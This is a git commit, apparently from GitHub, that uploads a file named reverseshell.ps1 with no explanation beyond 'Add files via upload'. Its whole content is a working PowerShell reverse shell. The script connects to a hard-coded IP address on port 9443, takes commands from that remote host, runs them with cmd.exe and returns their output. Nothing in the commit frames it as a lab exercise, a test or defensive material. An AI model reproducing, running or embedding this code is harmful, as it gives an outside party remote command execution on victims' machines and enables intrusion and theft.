ff135516718d23ae0555a359db8f6ca30de6deca
Antonio F Camelo <113397323+antoniocamello@users.noreply.github.com>
2024-10-04 09:06:05 -0300

    Add files via upload

---
+++ reverseshell.ps1
@@ -0,0 +1,19 @@
+﻿$client = New-Object System.Net.Sockets.TCPClient('137.1.1.144', 9443);
+$stream = $client.GetStream();
+$writer = New-Object System.IO.StreamWriter($stream);
+$writer.AutoFlush = $true;
+
+$buffer = New-Object byte[] 1024;
+$encoding = New-Object Text.ASCIIEncoding;
+
+while(($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+    $cmd = ($encoding.GetString($buffer, 0, $read)).Trim();
+    try {
+        $output = (cmd.exe /c $cmd 2>&1 | Out-String);
+        $writer.WriteLine($output);
+        $writer.Flush();
+    } catch {
+        $writer.WriteLine("Error executing command: $_");
+    }
+}
+$client.Close();
